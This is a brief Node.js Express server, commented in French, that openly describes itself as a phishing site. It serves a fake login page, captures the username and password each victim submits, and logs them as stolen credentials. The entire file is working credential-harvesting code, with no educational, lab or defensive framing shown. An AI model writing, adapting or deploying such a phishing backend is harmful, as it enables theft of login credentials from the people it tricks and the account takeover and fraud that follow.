const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// Servir le fichier HTML de la fausse page de connexion
app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Capturer les informations d'identification postées par la victime
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`Identifiants volés - Username: ${username}, Password: ${password}`);
    res.send('Merci pour vos identifiants !');
});

// Lancement du serveur
app.listen(4000, () => {
    console.log('Site de phishing en cours d\'exécution sur http://localhost:4000');
});
